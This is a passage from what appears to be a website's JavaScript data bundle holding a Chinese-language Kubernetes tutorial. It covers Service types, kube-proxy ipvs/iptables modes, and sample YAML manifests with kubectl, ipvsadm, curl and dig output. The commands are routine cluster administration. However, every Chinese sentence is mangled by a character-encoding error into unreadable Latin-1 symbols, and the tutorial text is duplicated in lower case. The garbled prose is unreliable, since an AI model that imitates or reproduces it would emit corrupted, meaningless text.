æ¥ç\n[root@k8s-master01 ~]# kubectl get ing ingress-https -n dev\nname            hosts                                  address         ports     age\ningress-https   nginx.itheima.com,tomcat.itheima.com   10.104.184.38   80, 443   2m42s\n\n# æ¥çè¯¦æ\n[root@k8s-master01 ~]# kubectl describe ing ingress-https -n dev\n...\ntls:\n  tls-secret terminates nginx.itheima.com,tomcat.itheima.com\nrules:\nhost              path backends\n----              ---- --------\nnginx.itheima.com  /  nginx-service:80 (10.244.1.97:80,10.244.1.98:80,10.244.2.119:80)\ntomcat.itheima.com /  tomcat-service:8080(10.244.1.99:8080,10.244.2.117:8080,10.244.2.120:8080)\n...\n\n# ä¸é¢å¯ä»¥éè¿æµè§å¨è®¿é®https://nginx.itheima.com:31335 å https://tomcat.itheima.com:31335æ¥æ¥çäº\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0}},{title:"kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨",frontmatter:{title:"kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/608.kubernetes(%E4%B9%9D)%20Service%E4%BB%8B%E7%BB%8D%E3%80%81%E7%B1%BB%E5%9E%8B%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"04.è¿ç»´/60.Kubernetes/608.kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨.md",key:"v-3701b2bc",path:"/kubernetes/608/",headers:[{level:2,title:"Serviceä»ç»",slug:"serviceä»ç»",normalizedTitle:"service ä»ç»",charIndex:2},{level:2,title:"Serviceç±»å",slug:"serviceç±»å",normalizedTitle:"service ç±»å",charIndex:2300},{level:2,title:"Serviceä½¿ç¨",slug:"serviceä½¿ç¨",normalizedTitle:"service ä½¿ç¨",charIndex:3026},{level:3,title:"å®éªç¯å¢åå¤",slug:"å®éªç¯å¢åå¤",normalizedTitle:"å®éªç¯å¢åå¤",charIndex:3041},{level:3,title:"ClusterIPç±»åçService",slug:"clusteripç±»åçservice",normalizedTitle:"clusterip ç±»åç service",charIndex:4475},{level:3,title:"HeadLinessç±»åçService",slug:"headlinessç±»åçservice",normalizedTitle:"headliness ç±»åç service",charIndex:7662},{level:3,title:"NodePortç±»åçService",slug:"nodeportç±»åçservice",normalizedTitle:"nodeport ç±»åç service",charIndex:9573},{level:3,title:"LoadBalancerç±»åçService",slug:"loadbalancerç±»åçservice",normalizedTitle:"loadbalancer ç±»åç service",charIndex:10529},{level:3,title:"ExternalNameç±»åçService",slug:"externalnameç±»åçservice",normalizedTitle:"externalname ç±»åç service",charIndex:10687}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Serviceä»ç» Serviceç±»å Serviceä½¿ç¨ å®éªç¯å¢åå¤ ClusterIPç±»åçService HeadLinessç±»åçService NodePortç±»åçService LoadBalancerç±»åçService ExternalNameç±»åçService",content:'# Service ä»ç»\n\nå¨ kubernetes ä¸­ï¼pod æ¯åºç¨ç¨åºçè½½ä½ï¼æä»¬å¯ä»¥éè¿ pod ç ip æ¥è®¿é®åºç¨ç¨åºï¼ä½æ¯ pod ç ip å°åä¸æ¯åºå®çï¼è¿ä¹å°±æå³çä¸æ¹ä¾¿ç´æ¥éç¨ pod ç ip å¯¹æå¡è¿è¡è®¿é®ã\n\nä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼kubernetes æä¾äº Service èµæºï¼Service ä¼å¯¹æä¾åä¸ä¸ªæå¡çå¤ä¸ª pod è¿è¡èåï¼å¹¶ä¸æä¾ä¸ä¸ªç»ä¸çå¥å£å°åãéè¿è®¿é® Service çå¥å£å°åå°±è½è®¿é®å°åé¢ç pod æå¡ã\n\n\n\nService å¨å¾å¤æåµä¸åªæ¯ä¸ä¸ªæ¦å¿µï¼çæ­£èµ·ä½ç¨çå¶å®æ¯ kube-proxy æå¡è¿ç¨ï¼æ¯ä¸ª Node èç¹ä¸é½è¿è¡çä¸ä¸ª kube-proxy æå¡è¿ç¨ãå½åå»º Service çæ¶åä¼éè¿ api-server å etcd åå¥åå»ºç service çä¿¡æ¯ï¼è kube-proxy ä¼åºäºçå¬çæºå¶åç°è¿ç§ Service çåå¨ï¼ç¶åå®ä¼å°ææ°ç Service ä¿¡æ¯è½¬æ¢æå¯¹åºçè®¿é®è§åã\n\n\n\nè§åæ iptablesï¼ipvs ç­ï¼ç®åä»ç»ä¸ ipvs è§å\n\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 æ¯ service æä¾çè®¿é®å¥å£ï¼å½è®¿é®è¿ä¸ªå¥å£çæ¶åï¼å¯ä»¥åç°åé¢æä¸ä¸ª pod çæå¡å¨ç­å¾è°ç¨ï¼kube-proxy ä¼åºäº rrï¼è½®è¯¢ï¼çç­ç¥ï¼å°è¯·æ±ååå°å¶ä¸­ä¸ä¸ª pod ä¸å»ï¼è¿ä¸ªè§åä¼åæ¶å¨éç¾¤åçææèç¹ä¸é½çæï¼æä»¥å¨ä»»ä½ä¸ä¸ªèç¹ä¸è®¿é®é½å¯ä»¥ã\n\nkube-proxy ç®åæ¯æä¸ç§å·¥ä½æ¨¡å¼:\nuserspace æ¨¡å¼\nuserspace æ¨¡å¼ä¸ï¼kube-proxy ä¼ä¸ºæ¯ä¸ä¸ª Service åå»ºä¸ä¸ªçå¬ç«¯å£ï¼åå Cluster IP çè¯·æ±è¢« Iptables è§åéå®åå° kube-proxy çå¬çç«¯å£ä¸ï¼kube-proxy æ ¹æ® LB ç®æ³éæ©ä¸ä¸ªæä¾æå¡ç Pod å¹¶åå¶å»ºç«é¾æ¥ï¼ä»¥å°è¯·æ±è½¬åå° Pod ä¸ã è¯¥æ¨¡å¼ä¸ï¼kube-proxy åå½äºä¸ä¸ªåå±è´è´£åè¡¡å¨çè§è²ãç±äº kube-proxy è¿è¡å¨ userspace ä¸­ï¼å¨è¿è¡è½¬åå¤çæ¶ä¼å¢å åæ ¸åç¨æ·ç©ºé´ä¹é´çæ°æ®æ·è´ï¼è½ç¶æ¯è¾ç¨³å®ï¼ä½æ¯æçæ¯è¾ä½ã\n\n\n\niptables æ¨¡å¼\niptables æ¨¡å¼ä¸ï¼kube-proxy ä¸º service åç«¯çæ¯ä¸ª Pod åå»ºå¯¹åºç iptables è§åï¼ç´æ¥å°åå Cluster IP çè¯·æ±éå®åå°ä¸ä¸ª Pod IPã è¯¥æ¨¡å¼ä¸ kube-proxy ä¸æ¿æåå±è´è´£åè¡¡å¨çè§è²ï¼åªè´è´£åå»º iptables è§åãè¯¥æ¨¡å¼çä¼ç¹æ¯è¾ userspace æ¨¡å¼æçæ´é«ï¼ä½ä¸è½æä¾çµæ´»ç LB ç­ç¥ï¼å½åç«¯ Pod ä¸å¯ç¨æ¶ä¹æ æ³è¿è¡éè¯ã\n\n\n\nipvs æ¨¡å¼\nipvs æ¨¡å¼å iptables ç±»ä¼¼ï¼kube-proxy çæ§ Pod çååå¹¶åå»ºç¸åºç ipvs è§åãipvs ç¸å¯¹ iptables è½¬åæçæ´é«ãé¤æ­¤ä»¥å¤ï¼ipvs æ¯ææ´å¤ç LB ç®æ³ã\n\n\n\næ­¤æ¨¡å¼å¿é¡»å®è£ ipvs åæ ¸æ¨¡åï¼å¦åä¼éçº§ä¸º iptablesï¼å¼å¯ ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# ä¿®æ¹mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# Service ç±»å\n\nService çèµæºæ¸åæä»¶ï¼\n\nkind: Service  # èµæºç±»å\napiVersion: v1  # èµæºçæ¬\nmetadata: # åæ°æ®\n  name: service # èµæºåç§°\n  namespace: dev # å½åç©ºé´\nspec: # æè¿°\n  selector: # æ ç­¾éæ©å¨ï¼ç¨äºç¡®å®å½åserviceä»£çåªäºpod\n    app: nginx\n  type: # Serviceç±»åï¼æå®serviceçè®¿é®æ¹å¼\n  clusterIP:  # èææå¡çipå°å\n  sessionAffinity: # sessionäº²åæ§ï¼æ¯æClientIPãNoneä¸¤ä¸ªéé¡¹ï¼å¯ä»¥æåä¸ä¸ªæºçè¯·æ±ï¼åå°ä¸ä¸ªå·ä½çPodä¸\n  ports: # ç«¯å£ä¿¡æ¯\n    - protocol: TCP \n      port: 3017  # serviceç«¯å£\n      targetPort: 5003 # podç«¯å£\n      nodePort: 31122 # ä¸»æºç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntypeï¼\n\n * ClusterIPï¼é»è®¤å¼ï¼å®æ¯ Kubernetes ç³»ç»èªå¨åéçèæ IPï¼åªè½å¨éç¾¤åé¨è®¿é®\n * NodePortï¼å° Service éè¿æå®ç Node ä¸çç«¯å£æ´é²ç»å¤é¨ï¼éè¿æ­¤æ¹æ³ï¼å°±å¯ä»¥å¨éç¾¤å¤é¨è®¿é®æå¡\n * LoadBalancerï¼ä½¿ç¨å¤æ¥è´è½½åè¡¡å¨å®æå°æå¡çè´è½½ååï¼æ³¨ææ­¤æ¨¡å¼éè¦å¤é¨äºç¯å¢æ¯æ\n * ExternalNameï¼ æéç¾¤å¤é¨çæå¡å¼å¥éç¾¤åé¨ï¼ç´æ¥ä½¿ç¨\n\n\n# Service ä½¿ç¨\n\n\n# å®éªç¯å¢åå¤\n\nå¨ä½¿ç¨ service ä¹åï¼é¦åå©ç¨ Deployment åå»ºåº 3 ä¸ª podï¼æ³¨æè¦ä¸º pod è®¾ç½® app=nginx-pod çæ ç­¾\nåå»º deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                             READY   STATUS     IP            NODE     LABELS\npc-deployment-66cb59b984-8p84h   1/1     Running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     Running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     Running    10.244.1.40   node1    app=nginx-pod\n\n# ä¸ºäºæ¹ä¾¿åé¢çæµè¯ï¼ä¿®æ¹ä¸ä¸å°nginxçindex.htmlé¡µé¢ï¼ä¸å°ä¿®æ¹çIPå°åä¸ä¸è´ï¼\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#ä¿®æ¹å®æ¯ä¹åï¼è®¿é®æµè¯\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# ClusterIP ç±»åç Service\n\næ¯éç¾¤åé¨å°åï¼åªè½éè¿ Node éç¾¤åé¨è®¿é®ï¼åå»º service-clusterip.yaml æä»¶\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: 10.97.97.97 # serviceçipå°åï¼å¦æä¸åï¼é»è®¤ä¼çæä¸ä¸ª\n  type: ClusterIP\n  ports:\n  - port: 80  # Serviceç«¯å£       \n    targetPort: 80 # podç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-clusterip   ClusterIP   10.97.97.97   <none>        80/TCP    13s   app=nginx-pod\n\n# æ¥çserviceçè¯¦ç»ä¿¡æ¯\n# å¨è¿éæä¸ä¸ªEndpointsåè¡¨ï¼éé¢å°±æ¯å½åserviceå¯ä»¥è´è½½å°çæå¡å¥å£\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nName:              service-clusterip\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                10.97.97.97\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# æ¥çipvsçæ å°è§å\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# è®¿é®10.97.97.97:80è§å¯ææ\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nEndpoint\n\nEndpoint æ¯ kubernetes ä¸­çä¸ä¸ªèµæºå¯¹è±¡ï¼å­å¨å¨ etcd ä¸­ï¼ç¨æ¥è®°å½ä¸ä¸ª service å¯¹åºçææ pod çè®¿é®å°åï¼å®æ¯æ ¹æ® service éç½®æä»¶ä¸­ selector æè¿°äº§ççã\n\nä¸ä¸ª Service ç±ä¸ç» Pod ç»æï¼è¿äº Pod éè¿ Endpoints æ´é²åºæ¥ï¼Endpoints æ¯å®ç°å®éæå¡çç«¯ç¹éåãæ¢å¥è¯è¯´ï¼service å pod ä¹é´çèç³»æ¯éè¿ endpoints å®ç°çã\n\n\n\nè´è½½ååç­ç¥\nå¯¹ Service çè®¿é®è¢«ååå°äºåç«¯ç Pod ä¸å»ï¼ç®å kubernetes æä¾äºä¸¤ç§è´è½½ååç­ç¥ï¼\n\n * å¦æä¸å®ä¹ï¼é»è®¤ä½¿ç¨ kube-proxy çç­ç¥ï¼æ¯å¦éæºãè½®è¯¢\n * åºäºå®¢æ·ç«¯å°åçä¼è¯ä¿ææ¨¡å¼ï¼å³æ¥èªåä¸ä¸ªå®¢æ·ç«¯åèµ·çææè¯·æ±é½ä¼è½¬åå°åºå®çä¸ä¸ª Pod ä¸\n   æ­¤æ¨¡å¼å¯ä»¥ä½¿å¨ spec ä¸­æ·»å  sessionAffinity:ClientIP éé¡¹\n\n# æ¥çipvsçæ å°è§åãrr è½®è¯¢ã\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# ä¿®æ¹ååç­ç¥----sessionAffinity:ClientIP\n\n# æ¥çipvsè§åãpersistent ä»£è¡¨æä¹ã\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# å é¤service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# HeadLiness ç±»åç Service\n\nå¨æäºåºæ¯ä¸­ï¼å¼åäººåå¯è½ä¸æ³ä½¿ç¨ Service æä¾çè´è½½åè¡¡åè½ï¼èå¸æèªå·±æ¥æ§å¶è´è½½åè¡¡ç­ç¥ï¼éå¯¹è¿ç§æåµï¼kubernetes æä¾äº HeadLiness Serviceï¼è¿ç±» Service ä¸ä¼åé Cluster IPï¼å¦ææ³è¦è®¿é® serviceï¼åªè½éè¿ service çååè¿è¡æ¥è¯¢ã\n\nåå»º service-headliness.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None # å°clusterIPè®¾ç½®ä¸ºNoneï¼å³å¯åå»ºheadliness Service\n  type: ClusterIP\n  ports:\n  - port: 80    \n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# è·åserviceï¼ åç°CLUSTER-IPæªåé\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-headliness   ClusterIP   None         <none>        80/TCP    11s   app=nginx-pod\n\n# æ¥çserviceè¯¦æ\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nName:              service-headliness\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                None\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# æ¥çååçè§£ææåµ\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# NodePort ç±»åç Service\n\nå¨ä¹åçæ ·ä¾ä¸­ï¼åå»ºç Service ç ip å°ååªæéç¾¤åé¨æå¯ä»¥è®¿é®ï¼å¦æå¸æå° Service æ´é²ç»éç¾¤å¤é¨ä½¿ç¨ï¼é£ä¹å°±è¦ä½¿ç¨å°å¦å¤ä¸ç§ç±»åç Serviceï¼ç§°ä¸º NodePort ç±»åãNodePort çå·¥ä½åçå¶å®å°±æ¯å° service çç«¯å£æ å°å° Node çä¸ä¸ªç«¯å£ä¸ï¼ç¶åå°±å¯ä»¥éè¿ NodeIp:NodePort æ¥è®¿é® service äºã\n\n\n\nåå»º service-nodeport.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: NodePort # serviceç±»å\n  ports:\n  - port: 80\n    nodePort: 30002 # æå®ç»å®çnodeçç«¯å£(é»è®¤çåå¼èå´æ¯ï¼30000-32767), å¦æä¸æå®ï¼ä¼é»è®¤åé\n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME               TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)       SELECTOR\nservice-nodeport   NodePort   10.105.64.191   <none>        80:30002/TCP  app=nginx-pod\n\n# æ¥ä¸æ¥å¯ä»¥éè¿çµèä¸»æºçæµè§å¨å»è®¿é®éç¾¤ä¸­ä»»æä¸ä¸ªnodeipç30002ç«¯å£ï¼å³å¯è®¿é®å°pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# LoadBalancer ç±»åç Service\n\nLoadBalancer å NodePort å¾ç¸ä¼¼ï¼ç®çé½æ¯åå¤é¨æ´é²ä¸ä¸ªç«¯å£ï¼åºå«å¨äº LoadBalancer ä¼å¨éç¾¤çå¤é¨åæ¥åä¸ä¸ªè´è½½åè¡¡è®¾å¤ï¼èè¿ä¸ªè®¾å¤éè¦å¤é¨ç¯å¢æ¯æçï¼å¤é¨æå¡åéå°è¿ä¸ªè®¾å¤ä¸çè¯·æ±ï¼ä¼è¢«è®¾å¤è´è½½ä¹åè½¬åå°éç¾¤ä¸­ã\n\n\n\n\n# ExternalName ç±»åç Service\n\nExternalName ç±»åç Service ç¨äºå¼å¥éç¾¤å¤é¨çæå¡ï¼å®éè¿ externalName å±æ§æå®å¤é¨ä¸ä¸ªæå¡çå°åï¼ç¶åå¨éç¾¤åé¨è®¿é®æ­¤ service å°±å¯ä»¥è®¿é®å°å¤é¨çæå¡äºã\n\n\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: ExternalName # serviceç±»å\n  externalName: www.baidu.com  #æ¹æipå°åä¹å¯ä»¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# ååè§£æ\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.\nwww.baidu.com.          30      IN      CNAME   www.a.shifen.com.\nwww.a.shifen.com.       30      IN      A       39.156.66.18\nwww.a.shifen.com.       30      IN      A       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# service ä»ç»\n\nå¨ kubernetes ä¸­ï¼pod æ¯åºç¨ç¨åºçè½½ä½ï¼æä»¬å¯ä»¥éè¿ pod ç ip æ¥è®¿é®åºç¨ç¨åºï¼ä½æ¯ pod ç ip å°åä¸æ¯åºå®çï¼è¿ä¹å°±æå³çä¸æ¹ä¾¿ç´æ¥éç¨ pod ç ip å¯¹æå¡è¿è¡è®¿é®ã\n\nä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼kubernetes æä¾äº service èµæºï¼service ä¼å¯¹æä¾åä¸ä¸ªæå¡çå¤ä¸ª pod è¿è¡èåï¼å¹¶ä¸æä¾ä¸ä¸ªç»ä¸çå¥å£å°åãéè¿è®¿é® service çå¥å£å°åå°±è½è®¿é®å°åé¢ç pod æå¡ã\n\n\n\nservice å¨å¾å¤æåµä¸åªæ¯ä¸ä¸ªæ¦å¿µï¼çæ­£èµ·ä½ç¨çå¶å®æ¯ kube-proxy æå¡è¿ç¨ï¼æ¯ä¸ª node èç¹ä¸é½è¿è¡çä¸ä¸ª kube-proxy æå¡è¿ç¨ãå½åå»º service çæ¶åä¼éè¿ api-server å etcd åå¥åå»ºç service çä¿¡æ¯ï¼è kube-proxy ä¼åºäºçå¬çæºå¶åç°è¿ç§ service çåå¨ï¼ç¶åå®ä¼å°ææ°ç service ä¿¡æ¯è½¬æ¢æå¯¹åºçè®¿é®è§åã\n\n\n\nè§åæ iptablesï¼ipvs ç­ï¼ç®åä»ç»ä¸ ipvs è§å\n\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 æ¯ service æä¾çè®¿é®å¥å£ï¼å½è®¿é®è¿ä¸ªå¥å£çæ¶åï¼å¯ä»¥åç°åé¢æä¸ä¸ª pod çæå¡å¨ç­å¾è°ç¨ï¼kube-proxy ä¼åºäº rrï¼è½®è¯¢ï¼çç­ç¥ï¼å°è¯·æ±ååå°å¶ä¸­ä¸ä¸ª pod ä¸å»ï¼è¿ä¸ªè§åä¼åæ¶å¨éç¾¤åçææèç¹ä¸é½çæï¼æä»¥å¨ä»»ä½ä¸ä¸ªèç¹ä¸è®¿é®é½å¯ä»¥ã\n\nkube-proxy ç®åæ¯æä¸ç§å·¥ä½æ¨¡å¼:\nuserspace æ¨¡å¼\nuserspace æ¨¡å¼ä¸ï¼kube-proxy ä¼ä¸ºæ¯ä¸ä¸ª service åå»ºä¸ä¸ªçå¬ç«¯å£ï¼åå cluster ip çè¯·æ±è¢« iptables è§åéå®åå° kube-proxy çå¬çç«¯å£ä¸ï¼kube-proxy æ ¹æ® lb ç®æ³éæ©ä¸ä¸ªæä¾æå¡ç pod å¹¶åå¶å»ºç«é¾æ¥ï¼ä»¥å°è¯·æ±è½¬åå° pod ä¸ã è¯¥æ¨¡å¼ä¸ï¼kube-proxy åå½äºä¸ä¸ªåå±è´è´£åè¡¡å¨çè§è²ãç±äº kube-proxy è¿è¡å¨ userspace ä¸­ï¼å¨è¿è¡è½¬åå¤çæ¶ä¼å¢å åæ ¸åç¨æ·ç©ºé´ä¹é´çæ°æ®æ·è´ï¼è½ç¶æ¯è¾ç¨³å®ï¼ä½æ¯æçæ¯è¾ä½ã\n\n\n\niptables æ¨¡å¼\niptables æ¨¡å¼ä¸ï¼kube-proxy ä¸º service åç«¯çæ¯ä¸ª pod åå»ºå¯¹åºç iptables è§åï¼ç´æ¥å°åå cluster ip çè¯·æ±éå®åå°ä¸ä¸ª pod ipã è¯¥æ¨¡å¼ä¸ kube-proxy ä¸æ¿æåå±è´è´£åè¡¡å¨çè§è²ï¼åªè´è´£åå»º iptables è§åãè¯¥æ¨¡å¼çä¼ç¹æ¯è¾ userspace æ¨¡å¼æçæ´é«ï¼ä½ä¸è½æä¾çµæ´»ç lb ç­ç¥ï¼å½åç«¯ pod ä¸å¯ç¨æ¶ä¹æ æ³è¿è¡éè¯ã\n\n\n\nipvs æ¨¡å¼\nipvs æ¨¡å¼å iptables ç±»ä¼¼ï¼kube-proxy çæ§ pod çååå¹¶åå»ºç¸åºç ipvs è§åãipvs ç¸å¯¹ iptables è½¬åæçæ´é«ãé¤æ­¤ä»¥å¤ï¼ipvs æ¯ææ´å¤ç lb ç®æ³ã\n\n\n\næ­¤æ¨¡å¼å¿é¡»å®è£ ipvs åæ ¸æ¨¡åï¼å¦åä¼éçº§ä¸º iptablesï¼å¼å¯ ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# ä¿®æ¹mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -ln\nip virtual server version 1.2.1 (size=4096)\nprot localaddress:port scheduler flags\n  -> remoteaddress:port           forward weight activeconn inactconn\ntcp  10.97.97.97:80 rr\n  -> 10.244.1.39:80               masq    1      0          0\n  -> 10.244.1.40:80               masq    1      0          0\n  -> 10.244.2.33:80               masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# service ç±»å\n\nservice çèµæºæ¸åæä»¶ï¼\n\nkind: service  # èµæºç±»å\napiversion: v1  # èµæºçæ¬\nmetadata: # åæ°æ®\n  name: service # èµæºåç§°\n  namespace: dev # å½åç©ºé´\nspec: # æè¿°\n  selector: # æ ç­¾éæ©å¨ï¼ç¨äºç¡®å®å½åserviceä»£çåªäºpod\n    app: nginx\n  type: # serviceç±»åï¼æå®serviceçè®¿é®æ¹å¼\n  clusterip:  # èææå¡çipå°å\n  